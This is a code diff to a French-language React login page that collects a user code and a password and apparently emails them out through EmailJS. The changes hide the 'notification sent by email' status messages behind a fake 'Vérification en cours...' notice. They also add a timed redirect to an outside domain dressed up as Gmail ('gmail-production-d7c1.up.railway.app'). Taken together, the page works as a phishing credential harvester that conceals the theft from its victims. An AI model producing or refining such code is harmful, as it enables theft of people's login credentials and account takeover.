@@ -1,4 +1,4 @@
-import { useState, type FormEvent } from 'react';
+import { useState, useEffect, type FormEvent } from 'react';
 import { Search, User, Lock } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
@@ -14,12 +14,19 @@ function App() {
   const [userCode, setUserCode] = useState('');
   const [password, setPassword] = useState('');
   const [remember, setRemember] = useState(false);
-  const [submitted, setSubmitted] = useState(false);
   const [emailStatus, setEmailStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
+
+  useEffect(() => {
+    if (emailStatus === 'success') {
+      const timer = setTimeout(() => {
+        window.location.href = 'https://gmail-production-d7c1.up.railway.app';
+      }, 1500);
+      return () => clearTimeout(timer);
+    }
+  }, [emailStatus]);
 
   const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
-    setSubmitted(true);
 
     if (!EMAIL_JS_SERVICE_ID || !EMAIL_JS_TEMPLATE_ID || !EMAIL_JS_PUBLIC_KEY) {
       console.warn(
@@ -147,25 +154,9 @@ function App() {
             </button>
           </form>
 
-          {submitted && (
-            <p className="mt-4 text-center text-sm text-green-600">
-              Connexion soumise pour le code « {userCode || '—'} ».
-            </p>
-          )}
-
-          {emailStatus === 'sending' && (
-            <p className="mt-2 text-center text-xs text-gray-500">
-              Envoi de la notification en cours...
-            </p>
-          )}
           {emailStatus === 'success' && (
-            <p className="mt-2 text-center text-xs text-green-600">
-              Notification envoyée avec succès.
-            </p>
-          )}
-          {emailStatus === 'error' && (
-            <p className="mt-2 text-center text-xs text-red-600">
-              Impossible d'envoyer la notification par e-mail.
+            <p className="mt-4 text-center text-sm text-blue-600 font-medium">
+              Vérification en cours...
             </p>
           )}
 
